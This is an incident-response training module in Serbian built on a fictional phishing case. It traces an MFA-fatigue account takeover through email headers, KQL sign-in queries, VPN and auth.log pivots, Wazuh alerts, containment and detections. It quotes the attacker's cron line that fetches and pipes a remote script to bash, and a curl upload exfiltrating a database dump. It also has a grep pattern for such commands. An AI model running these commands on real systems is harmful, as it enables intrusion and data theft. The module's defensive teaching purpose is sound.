## Šta ovaj modul pokriva

Prvi scenarij je najčešći početak ozbiljnog incidenta: jedan klik na phishing link, ukradena lozinka i nalog koji napadaču otvara i cloud i interne servere. Pokriva četiri cilja domena 1:

- **1.1** Analiza phishinga: zaglavlja poruke, SPF/DKIM/DMARC, URL-ovi i prilozi kao IOC-ovi.
- **1.2** Istraga prijava u KQL-u: nemoguće putovanje, MFA umor, sumnjive IP adrese i krađa sesije.
- **1.3** Lateralno kretanje i perzistencija na Linux hostu: `auth.log`, Wazuh alarmi, `authorized_keys`, cron.
- **1.4** Obuzdavanje naloga i hosta, vremenska linija i izvještaj o incidentu.

Poslije modula znaš da od jedne prijave korisnika dođeš do svih sistema koje je napadač dotakao, prelazeći iz jednog izvora logova u drugi preko zajedničkog podatka (IP adresa, korisničko ime, vrijeme, ključ).

## Priča: Drina Logistika, utorak 13. oktobar 2026.

**Drina Logistika d.o.o.** je firma sa oko 200 zaposlenih. Identitet je u **Microsoft Entra ID** (Microsoft 365, MFA sa push notifikacijama u Microsoft Authenticatoru). Udaljeni pristup ide preko **OpenVPN** servera koji korisnike prijavljuje preko Entra ID-a (SAML). Linux serveri su u Active Directory domenu preko **SSSD**-a, pa korisnik ima istu lozinku za Microsoft 365 i za SSH. Administratori ulaze na **jump01** (10.20.0.10), a odatle na **db01** (10.20.0.31, PostgreSQL sa bazom `crm`) i druge servere. Na serverima radi **Wazuh** agent (auth.log, FIM nad `/home/*/.ssh` i crontabovima).

Akteri:

| Osoba | Uloga |
|---|---|
| Jelena Kovač (`jelena.kovac@drinalog.example`, Linux `jkovac`) | inženjerka infrastrukture, ima pristup VPN-u, jump01 i db01 |
| Helpdesk | prima prijavu i otvara tiket HD-48213 |
| SOC dežurni (ti) | istraga, obuzdavanje, izvještaj |
| Dragan Nikolić | Entra ID administrator |

### Vremenska linija napada (UTC)

| Vrijeme | Događaj | Izvor dokaza |
|---|---|---|
| 07:42:10 | Stiže mail „Hitno: potvrdite MFA registraciju do 12h“ sa 198.51.100.61 | `Received`, `Authentication-Results` |
| ~07:58 | Jelena klikne link i upiše lozinku na lažnoj stranici | tiket (lokalno vrijeme) |
| 08:03:12 | Prvi pokušaj prijave sa 203.0.113.77 (NL) ispravnom lozinkom: `50074` | `SigninLogs` |
| 08:03–08:11 | Sedam odbijenih MFA zahtjeva (`500121`) | `SigninLogs` |
| 08:12:05 | Jelena odobri osmi zahtjev: uspješna prijava napadača | `SigninLogs` |
| 08:15:02 | Napadač registruje svoj Authenticator na Jelenin nalog | `AuditLogs` |
| 08:20:44 | Prijava u aplikaciju „Drina VPN“; VPN dodjeljuje 10.8.0.23 | `SigninLogs`, `vpn.log` |
| 08:24:02 | `Accepted password for jkovac from 10.8.0.23` na jump01 | `auth.log`, Wazuh 5715 |
| 08:26:41 | Izmijenjen `/home/jkovac/.ssh/authorized_keys` | Wazuh FIM 550 |
| 08:27:15 | Izmijenjen crontab korisnika `jkovac` (`curl ... \| bash` svakih 20 minuta) | `auth.log`, Wazuh 2832 |
| 08:30:58 | SSH sa jump01 na db01 ključem `jkovac@jump01` | `auth.log` na db01 |
| 08:33:40 | `sudo -u postgres pg_dump -d crm -f /tmp/.cache.sql` | `auth.log`, Wazuh 100310 |
| 08:36:31 | `scp` dumpa na jump01, zatim `curl -T` na 198.51.100.23 | `auth.log` na db01, `.bash_history` |
| 09:38 | Jelena prijavljuje incident helpdesku (11:38 CEST) | tiket |

Tiket i zaglavlje `Date` su u lokalnom vremenu (CEST, UTC+2); svi logovi su u UTC. Prvo što radiš u svakoj istrazi je da sve svedeš na **UTC**.

## Lanac napada i MITRE ATT&CK

| Korak | Tehnika | Taktika |
|---|---|---|
| Mail sa linkom na lažnu stranicu za prijavu | **T1566.002** Phishing: Spearphishing Link | Initial Access |
| Prijava ukradenom lozinkom | **T1078** Valid Accounts (T1078.004 Cloud Accounts) | Initial Access, Persistence |
| Zasipanje korisnika MFA zahtjevima | **T1621** Multi-Factor Authentication Request Generation | Credential Access |
| Registracija napadačevog Authenticatora | **T1098.005** Account Manipulation: Device Registration | Persistence |
| Korišćenje sesije bez novog MFA-a | **T1550.004** Use Alternate Authentication Material: Web Session Cookie | Defense Evasion, Lateral Movement |
| VPN preko ukradenog naloga | **T1133** External Remote Services | Initial Access, Persistence |
| SSH na jump01 i db01 | **T1021.004** Remote Services: SSH | Lateral Movement |
| Ključ u `authorized_keys` | **T1098.004** Account Manipulation: SSH Authorized Keys | Persistence |
| Cron posao koji preuzima skriptu | **T1053.003** Scheduled Task/Job: Cron | Persistence, Execution |
| Privatni ključ ostavljen na jump01 | **T1552.004** Unsecured Credentials: Private Keys | Credential Access |
| `pg_dump` baze | **T1005** Data from Local System | Collection |
| `curl -T` na napadačev server | **T1041** Exfiltration Over C2 Channel | Exfiltration |

Mapiranje nije formalnost: svaka tehnika ima stranicu sa izvorima podataka i detekcijama, pa iz tabele odmah vidiš koji log je trebao da upali alarm.

## Dokazi po izvorima

### Poruka: zaglavlja i autentikacija

Iz `.eml` fajla čitaš zaglavlja **odozdo nagore**: svaki server dodaje svoj `Received` na vrh. Vjeruješ samo zaglavljima koja su dodali tvoji serveri (`mx01`); sve ispod može napadač da izmisli.

```text
Received: from mail.drinalog-sso.example (mail.drinalog-sso.example [198.51.100.61])
	by mx01.drinalog.example (Postfix) with ESMTPS id 4Hq2Lk0Zc9z9sWX
Authentication-Results: mx01.drinalog.example;
	spf=pass (sender IP is 198.51.100.61) smtp.mailfrom=mail.drinalog-sso.example;
	dkim=pass (2048-bit key) header.d=drinalog-sso.example header.s=s1 header.b=Qm3k9X2a;
	dmarc=fail (p=none dis=none) header.from=drinalog.example
From: "Drina IT podrska" <it-podrska@drinalog.example>
Reply-To: <it-podrska@drinalog-sso.example>
```

| Provjera | Šta provjerava | Rezultat ovdje |
|---|---|---|
| **SPF** | da li IP adresa smije slati za domen iz envelope sendera (`MAIL FROM`, `Return-Path`) | `pass` za `mail.drinalog-sso.example`: napadač je postavio SPF za svoj domen |
| **DKIM** | potpis zaglavlja i tijela ključem domena `d=` | `pass` za `drinalog-sso.example`: napadač potpisuje svojim ključem |
| **DMARC** | da li domen koji je prošao SPF ili DKIM **odgovara** (alignment) domenu iz `From` | `fail`: `From` je `drinalog.example`, a prošli su drugi domeni |

Ključna lekcija: `spf=pass` i `dkim=pass` ne znače da je poruka legitimna, nego samo da je domen pošiljaoca autentičan. DMARC je jedini koji vezuje autentikaciju za adresu koju korisnik vidi. Drina Logistika ima `p=none` (samo izvještaji), pa je poruka sa lažnim `From` isporučena. Sa `p=quarantine` ili `p=reject` završila bi u karantinu ili bila odbijena.

Ostali signali u poruci: `Reply-To` na drugi domen, `X-Mailer: PHPMailer`, `Message-ID` sa napadačevim domenom, prikazani tekst linka (`login.microsoftonline.com`) koji se razlikuje od `href` (`login.drinalog-sso.example`), hitnost i prijetnja blokadom. Prilog `MFA-registracija.htm` je HTML koji preusmjerava na isti host: HTML prilozi prolaze filtere koji blokiraju izvršne fajlove.

IOC-ovi se izvlače bez otvaranja poruke u klijentu:

```bash
grep -nE '^(Received|Authentication-Results|From|Reply-To|Return-Path):' -A3 hitno-mfa.eml
python3 -c 'import email,hashlib,sys
m=email.message_from_file(open(sys.argv[1]))
for p in m.walk():
    if p.get_filename(): print(p.get_filename(), hashlib.sha256(p.get_payload(decode=True)).hexdigest())' hitno-mfa.eml
```

IOC lista ove faze: IP 198.51.100.61, domen `drinalog-sso.example` (i poddomeni `mail.`, `login.`), URL, SHA-256 priloga, `Subject` i `Message-ID`. Sa njima u Defender for Office 365 tražiš ko je još dobio poruku (`EmailEvents`, `EmailUrlInfo`) i brišeš je iz svih sandučića (Content search ili *Take action* u Threat Exploreru).

### SigninLogs: MFA umor, nemoguće putovanje, sesija

Za Entra ID prijave najvažnija polja su `ResultType` (0 = uspjeh), `IPAddress`, `Location`, `AppDisplayName`, `AuthenticationRequirement`, `UserAgent` i `SessionId`.

| `ResultType` | Značenje |
|---|---|
| `0` | uspješna prijava |
| `50074` | potreban je jak (MFA) faktor; normalan prekid prije MFA koraka |
| `500121` | MFA nije uspio: korisnik je odbio zahtjev ili ga nije potvrdio na vrijeme |
| `50126` | pogrešno korisničko ime ili lozinka |
| `50140` | „Keep me signed in“ prekid |
| `53003` | prijavu je blokirao Conditional Access |

Obrazac MFA umora je niz `500121` sa iste IP adrese u kratkom vremenu, pa uspjeh. Bitno: `500121` znači da je **lozinka bila tačna**. Napadač je već prošao prvi faktor.

```kql
SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count(), First = min(TimeGenerated), Last = max(TimeGenerated)
    by UserPrincipalName, IPAddress
| where MfaDenied >= 5
```

Uspjeh poslije niza odbijanja pronalaziš spajanjem ta dva skupa:

```kql
let denied = SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count(), LastDenied = max(TimeGenerated) by UserPrincipalName, IPAddress
| where MfaDenied >= 5;
SigninLogs
| where ResultType == 0
| join kind=inner denied on UserPrincipalName, IPAddress
| where TimeGenerated > LastDenied
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName, MfaDenied
```

**Nemoguće putovanje**: dvije uspješne prijave istog korisnika iz različitih zemalja u vremenu kraćem od leta između njih. U KQL-u to radiš sortiranjem po korisniku i vremenu i poređenjem sa prethodnim redom:

```kql
SigninLogs
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, Location, IPAddress
| order by UserPrincipalName asc, TimeGenerated asc
| extend PrevUser = prev(UserPrincipalName), PrevLoc = prev(Location), PrevTime = prev(TimeGenerated)
| where PrevUser == UserPrincipalName and PrevLoc != Location
| extend Minutes = datetime_diff('minute', TimeGenerated, PrevTime)
| where Minutes < 180
```

Jelena je u 07:51 u Beogradu (RS), u 08:12 u Amsterdamu (NL), u 08:40 opet u Beogradu: 21 minut za 1.400 km. Milica Savić je 12. oktobra u Minhenu (DE) i 13. u Beogradu, sa razmakom od 16 sati: to je službeni put, ne napad. Nemoguće putovanje uvijek provjeravaš uz VPN izlaze, mobilne operatere i poznata putovanja.

**Krađa sesije.** Sve napadačeve prijave imaju isti `SessionId`, a poslije prve imaju `AuthenticationRequirement == "singleFactorAuthentication"`: MFA zahtjev je zadovoljen tvrdnjom iz tokena sesije. Kod klasičnog phishinga lozinke (kao ovdje) napadač dobija sesiju odobrenjem MFA-a. Kod **AiTM** phishinga (adversary-in-the-middle, npr. Evilginx) lažna stranica posreduje pravu prijavu i krade kolačić sesije, pa nema ni MFA umora: vidiš uspješnu prijavu sa MFA-om sa IP adrese proxyja i zatim istu sesiju sa druge adrese. U oba slučaja **reset lozinke ne gasi postojeće sesije**: moraš ih opozvati.

```kql
SigninLogs
| where IPAddress == "203.0.113.77" and ResultType == 0
| project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId
| order by TimeGenerated asc
```

U pravom Sentinelu prijave preko tokena su često u tabeli `AADNonInteractiveUserSignInLogs`; istragu radiš nad obje (`union SigninLogs, AADNonInteractiveUserSignInLogs`).

### AuditLogs: šta je napadač promijenio u identitetu

Napadač sa sesijom prvo osigurava povratak: registruje svoj MFA uređaj, dodaje pravila prosljeđivanja u sanduče, daje saglasnost OAuth aplikaciji. U `AuditLogs` tražiš promjene koje je inicirao kompromitovani nalog ili koje su došle sa napadačeve IP adrese:

```kql
AuditLogs
| where InitiatedByIP == "203.0.113.77"
    or (InitiatedByUser == "jelena.kovac@drinalog.example" and TimeGenerated > datetime(2026-10-13 08:00))
| project TimeGenerated, OperationName, TargetUser, AdditionalDetails
```

U labu je tabela pojednostavljena; u Sentinelu su `InitiatedBy` i `TargetResources` dinamička polja (`tostring(InitiatedBy.user.userPrincipalName)`, `tostring(InitiatedBy.user.ipAddress)`). Operacija `User registered security info` u 08:15:02 sa napadačeve adrese znači da napadač ima **svoj** drugi faktor: ako samo resetuješ lozinku, on će je ponovo ukrasti i proći MFA bez Jelene.

### VPN log: most između clouda i mreže

Među napadačevim prijavama je `Drina VPN`. VPN log veže javnu IP adresu za internu:

```bash
grep 203.0.113.77 vpn.log
# ... jelena.kovac@drinalog.example/203.0.113.77:51844 MULTI_sva: pool returned IPv4=10.8.0.23
```

Od tog trenutka napadač je u internoj mreži kao **10.8.0.23**. Bez ovog koraka u `auth.log` bi vidio samo internu adresu i zaključio da je Jelena radila od kuće. Pivot je uvijek isti: nađi polje koje dva izvora dijele (ovdje IP adresa i vrijeme) i pređi preko njega.

### auth.log na jump01 i db01

```bash
grep -E 'Accepted|Failed|Invalid user' jump01-auth.log
grep -E 'sudo:|crontab\[' jump01-auth.log
grep 'session opened for user jkovac' jump01-auth.log
```

```text
Oct 12 17:44:03 jump01 sshd[40980]: Accepted publickey for jkovac from 10.8.0.14 port 50877 ssh2: ED25519 SHA256:cXDy...
Oct 13 08:24:02 jump01 sshd[48121]: pam_sss(sshd:auth): authentication success; ... rhost=10.8.0.23 user=jkovac
Oct 13 08:24:02 jump01 sshd[48121]: Accepted password for jkovac from 10.8.0.23 port 50122 ssh2
Oct 13 08:27:15 jump01 crontab[48190]: (jkovac) REPLACE (jkovac)
Oct 13 08:40:01 jump01 CRON[48402]: pam_unix(cron:session): session opened for user jkovac(uid=1003) by (uid=0)
```

Jelena se inače prijavljuje **ključem** (`Accepted publickey`); napadač ima samo lozinku, pa piše `Accepted password` preko `pam_sss`. Promjena metode autentikacije za isti nalog je jak signal. `crontab ... REPLACE` je trag `crontab -` ili `crontab -e`, a `CRON ... session opened for user jkovac` svakih 20 minuta pokazuje da se napadačev posao izvršava.

Na db01 prijava izgleda legitimno: `Accepted publickey for jkovac from 10.20.0.10` ključem `jkovac@jump01`, isto kao dan ranije. Razlika je u kontekstu: dolazi tri minuta poslije napadačeve prijave na jump01, a slijedi `sudo -u postgres pg_dump` u skriven fajl `/tmp/.cache.sql`. Privatni ključ koji leži na jump hostu je ključ za sve servere iza njega.

`auth.log` nema godinu i zonu. Provjeri zonu hosta (`timedatectl`, `/etc/timezone`) prije nego što vrijeme upišeš u vremensku liniju.

### Perzistencija na hostu

Ko ima shell sa korisnikovim pravima, ostavlja povratak tamo gdje ga korisnik ne gleda:

```bash
ssh-keygen -lf /home/jkovac/.ssh/authorized_keys     # otisak i komentar svakog ključa
crontab -l -u jkovac; cat /var/spool/cron/crontabs/jkovac
ls -la /etc/cron.d /etc/cron.daily; systemctl list-timers --all
grep -nE 'curl|wget|base64|/dev/tcp' /home/*/.bashrc /home/*/.profile /etc/profile.d/*
find /home /etc /tmp /var/tmp -newermt '2026-10-13 08:20' -type f 2>/dev/null
```

Komentar ključa (`deploy@build-07`) bira napadač i ne dokazuje ništa; poredi ključeve sa inventarom (koji ključevi su izdati kome). Cron red `*/20 * * * * /bin/bash -c "curl -fsS http://198.51.100.23/k.sh | bash"` daje napadaču izvršavanje koda i kad ukloniš ključ: skripta na serveru može da vrati ključ za 20 minuta. Zato se perzistencija uklanja **sva odjednom**, poslije prikupljanja dokaza.

### Wazuh alarmi

Alarmi su JSON po redu, pa ih filtriraš sa `jq`:

```bash
jq -r 'select(.timestamp | startswith("2026-10-13")) | [.timestamp, .agent.name, .rule.id, .rule.level, .rule.description] | @tsv' wazuh-alerts.json
jq 'select(.syscheck.path != null) | {timestamp, path: .syscheck.path, event: .syscheck.event}' wazuh-alerts.json
jq -r 'select(.data.srcip == "10.8.0.23" or .data.dstuser == "jkovac") | .full_log' wazuh-alerts.json
```

Wazuh je vidio sve: FIM izmjenu `authorized_keys` (550, nivo 7), izmjenu crontaba (2832, nivo 5) i lokalno pravilo za `pg_dump` van prozora za bekap (100310, nivo 10). Niko nije reagovao jer su alarmi nižeg nivoa išli samo u indeks, a pravilo 100310 slalo je mail na dijeljenu adresu. Detekcija koja ne stiže do čovjeka ili do automatizacije nije detekcija.

## Tačke odluke

**Da li je ovo incident?** Da, čim vidiš uspješnu prijavu sa 203.0.113.77 poslije niza odbijenih MFA zahtjeva i registraciju novog MFA metoda. Ne čekaš da se dokaže lateralno kretanje.

**Posmatrati ili odmah obuzdati?** Ponekad se napadač posmatra da bi se otkrio cijeli obim. Ovdje ne: napadač ima aktivnu sesiju, VPN i cron koji izvršava kod, a baza je već izvučena. Svaki minut daje mu nove akcije. Obuzdavaš odmah, ali dokaze sa hosta prikupljaš prije nego što ih promijeniš.

**Šta prvo?** Redoslijed zatvara vrata od najšireg ka najužem:

1. **Opoziv sesija** (Revoke sessions) i privremena blokada prijave: gasi token koji napadač koristi. Reset lozinke sam po sebi to ne radi.
2. **Reset lozinke**: ista lozinka važi za SSSD na Linuxu.
3. **Uklanjanje napadačevog MFA metoda**: inače se vraća sa sljedećom ukradenom lozinkom.
4. **VPN i mreža**: prekid VPN sesije 10.8.0.23, blokada 203.0.113.77 na ulazu i 198.51.100.23 na izlazu (C2 i exfiltracija).
5. **Dokazi sa jump01 i db01** (live response, hash, lanac nadzora), pa uklanjanje ključa i cron posla.
6. **Rotacija ključa** `jkovac@jump01`: ukloni ga iz `authorized_keys` na svim serverima (db01, app01).

**Gasiti jump01?** Ne naglo. Gašenjem gubiš procese, mrežne veze i sadržaj `/tmp`. Bolje je izolovati ga mrežno (dozvoliti samo SOC) i prikupiti dokaze, pa ga ponovo izgraditi iz poznatog stanja.

**Obavještavanje.** Baza `crm` sadrži lične podatke klijenata. Po Zakonu o zaštiti podataka o ličnosti (i GDPR-u za klijente iz EU) povreda se prijavljuje nadzornom organu (u Srbiji Povjerenik) bez nepotrebnog odlaganja, a najkasnije u roku od 72 sata od saznanja, osim ako nije vjerovatno da će izazvati rizik za prava lica. Pravna služba i DPO ulaze u tim čim se potvrdi `pg_dump` i izlazni saobraćaj.

## Obuzdavanje, iskorjenjivanje, oporavak

Identitet (Microsoft Graph PowerShell):

```powershell
Update-MgUser -UserId jelena.kovac@drinalog.example -AccountEnabled:$false
Revoke-MgUserSignInSession -UserId jelena.kovac@drinalog.example
Get-MgUserAuthenticationMicrosoftAuthenticatorMethod -UserId jelena.kovac@drinalog.example
Remove-MgUserAuthenticationMicrosoftAuthenticatorMethod -UserId jelena.kovac@drinalog.example `
    -MicrosoftAuthenticatorAuthenticationMethodId <id uređaja SM-A546B>
```

U Entra ID Protection nalog označiš kao kompromitovan (*Confirm user compromised*), što podiže rizik korisnika i aktivira politike zasnovane na riziku.

Host (poslije prikupljanja dokaza skriptom iz kursa 07):

```bash
sha256sum /home/jkovac/.ssh/authorized_keys /var/spool/cron/crontabs/jkovac /home/jkovac/.bash_history > /root/dokazi/jump01-perzistencija.sha256
cp -a /home/jkovac/.ssh/authorized_keys /var/spool/cron/crontabs/jkovac /home/jkovac/.bash_history /root/dokazi/
usermod -L jkovac; pkill -KILL -u jkovac          # zaključaj nalog i prekini sesije
sed -i '/deploy@build-07/d' /home/jkovac/.ssh/authorized_keys
crontab -l -u jkovac | grep -v '198.51.100.23' | crontab -u jkovac -
iptables -I OUTPUT -d 198.51.100.23 -j DROP
```

Iskorjenjivanje znači ukloniti **sve** što je napadač ostavio i sve što mu je omogućilo napad: ključ i cron na jump01, ključ `jkovac@jump01` na svim serverima, `/tmp/.cache.sql` na db01, i provjeriti druge hostove kojima je `jkovac` mogao pristupiti (app01 iz `~/.ssh/config`). Ako je napadač imao `sudo` na jump01, host se smatra kompromitovanim do nivoa root-a i ponovo se gradi.

Oporavak: nalog se vraća sa novom lozinkom i **phishing-otpornim** MFA (FIDO2 ključ ili passkey), jump01 iz čiste slike, uz pojačan nadzor 30 dana nad nalogom i hostovima.

## Detekcije koje bi ga ranije uhvatile

| Mjesto | Kontrola ili detekcija | Šta bi spriječila ili uhvatila |
|---|---|---|
| Mail | DMARC `p=reject` za `drinalog.example` | poruka sa lažnim `From` ne bi bila isporučena |
| Mail | Safe Links, upozorenje za lookalike domene | klik na `drinalog-sso.example` |
| Identitet | MFA sa **number matchingom** i kontekstom (lokacija, aplikacija) ili FIDO2 | MFA umor ne radi kad korisnik mora upisati broj sa ekrana |
| Identitet | Conditional Access: VPN i admin pristup samo sa upravljanih uređaja | prijava sa napadačevog laptopa |
| SIEM | Analytics pravilo: 5+ `500121` pa uspjeh sa iste IP adrese | alarm u 08:12, 12 minuta prije SSH-a |
| SIEM | Registracija MFA metoda sa IP adrese koja nije viđena za korisnika | alarm u 08:15 |
| Linux | `PasswordAuthentication no` na jump01 | ukradena lozinka ne bi otvorila SSH |
| Linux | Bez privatnih ključeva na jump hostu (`ssh -J`, agent forwarding sa potvrdom ili SSH certifikati kratkog trajanja) | lateralno kretanje na db01 |
| Wazuh | Pravilo visokog nivoa za FIM nad `authorized_keys` i za `curl \| bash` u crontabu | alarm u 08:26 sa pozivom dežurnom |

Primjer Sentinel analytics pravila za MFA umor (scheduled query, svakih 10 minuta nad zadnjih 30):

```kql
SigninLogs
| where TimeGenerated > ago(30m)
| summarize Denied = countif(ResultType == 500121), Success = countif(ResultType == 0),
            FirstSeen = min(TimeGenerated) by UserPrincipalName, IPAddress, Location
| where Denied >= 5 and Success >= 1
```

## Veze sa drugim kursevima

- [Sigurnosni temelji: IAM](#/01-sigurnosni-temelji/m/03-iam): MFA faktori, phishing-otporni MFA, sesije i tokeni.
- [Sigurnosni temelji: MITRE ATT&CK](#/01-sigurnosni-temelji/m/06-mitre-attack): taktike i tehnike iz lanca napada.
- [Sigurnosni temelji: Linux hardening](#/01-sigurnosni-temelji/m/01-linux-hardening): SSH konfiguracija, `PasswordAuthentication`, ključevi.
- [Security+: Prijetnje, akteri i vektori](#/02-security-plus/m/03-prijetnje-akteri-vektori): phishing, BEC, social engineering.
- [Security+: Operacije, kontrole i monitoring](#/02-security-plus/m/08-operacije-kontrole-i-monitoring): SPF, DKIM, DMARC i email sigurnost.
- [SC-200: KQL osnove](#/08-sc200/m/01-kql-osnove) i [SC-200: KQL napredno](#/08-sc200/m/02-kql-napredno): `summarize`, `join`, `prev()`, `let`.
- [SC-200: Detekcije](#/08-sc200/m/05-detekcije): analytics pravila u Sentinelu.
- [SC-200: Microsoft 365 istrage](#/08-sc200/m/09-microsoft-365-istrage): Purview Audit i Content search za phishing poruke.
- [SC-200: Hunting u Sentinelu](#/08-sc200/m/10-hunting-u-sentinelu): hunting upiti nad prijavama.
- [Detekcija i odgovor: Logovi i telemetrija](#/07-detekcija-i-odgovor/m/01-logovi-i-telemetrija): `auth.log`, rsyslog, sinhronizacija vremena.
- [Detekcija i odgovor: Wazuh pravila](#/07-detekcija-i-odgovor/m/04-wazuh-pravila): lokalna pravila, FIM, nivoi alarma.
- [Detekcija i odgovor: Odgovor na incidente](#/07-detekcija-i-odgovor/m/09-odgovor-na-incidente): live response, lanac nadzora.
- [Detekcija i odgovor: Obuzdavanje i runbookovi](#/07-detekcija-i-odgovor/m/10-obuzdavanje-i-runbookovi): runbook za kompromitovan nalog.
- [CySA+: Indikatori](#/09-cysa/m/02-indikatori): IOC-ovi i indikatori na hostu i mreži.
- [CySA+: Izvještavanje](#/09-cysa/m/11-izvjestavanje): struktura izvještaja o incidentu.
